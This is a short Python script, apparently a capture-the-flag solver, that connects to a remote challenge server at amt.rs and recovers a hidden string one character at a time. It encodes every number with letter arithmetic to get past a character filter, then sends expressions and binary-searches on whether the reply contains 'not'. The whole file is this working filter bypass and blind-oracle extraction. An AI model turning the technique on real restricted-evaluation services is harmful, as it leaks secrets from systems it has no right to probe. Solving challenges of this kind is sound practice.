import socket
import time

def to_allowed(num):
    sum = 0
    if (num >= 39): sum += 1
    if (num >= 47): sum += 10
    if (num >= 81): sum += 1
    if (num >= 89): sum += 1
    if (num >= 92): sum += 1
    if (num >= 94): sum += 1
    if (num >= 101): sum += 1
    return num + sum

def allowed_to_back(num):
    sum = 0
    if (num >= 40): sum += 1
    if (num >= 48): sum += 10
    if (num >= 82): sum += 1
    if (num >= 90): sum += 1
    if (num >= 93): sum += 1
    if (num >= 95): sum += 1
    if (num >= 102): sum += 1
    return num - sum

def number_presentation(num):
    i = num % 25
    j = num // 25
    return f"((ord('Z') - ord('A')) * (ord('{chr(65 + j)}') - ord('A')) + ord('{chr(65 + i)}') - ord('A'))"

print(number_presentation(0))


# for i in range(0, 255):
#     print(i, to_allowed(i))

s = socket.socket()

# print("hi")
s.connect(('amt.rs', 31671))
# s.close
# time.sleep(10)
# s.connect(('amt.rs', 31670))
# print("2")
# print(s.recv(1024).decode())
notfound = True

for i in range(11, 56):
    min = 0
    max = 128
    j = 93
    char = 65
    notfound = True
    while notfound:
        s.send(f"chr(ord(_[{number_presentation(i)}]) - {number_presentation(j)})\n".encode())
        # print(f"chr(ord(_[{number_presentation(i)}]) - {number_presentation(j)})")
        time.sleep(0.5)
        a = s.recv(1024).decode()
        # print(a, "a")
        # print(j)
        if "not" not in a: # ord(_[i]) > j
            # char += 1
            min = j
            j = (max + min) // 2
            # print(chr(j))
        else: # ord(_[i]) <= j
            max = j
            j = (max + min) // 2
            # print(chr(j))
        if max - min == 1:
            s.send(f"chr(ord(_[{number_presentation(i)}]) - {number_presentation(j)})\n".encode())
            time.sleep(0.4)
            a = s.recv(1024).decode()
            if "not" in a:
                print(chr(max))
            else: print(chr(min))
            notfound = False
        if (j > 255): j = 0
    s.close()
    # time.sleep(1)
    s = socket.socket()
    s.connect(('amt.rs', 31671))

s.close()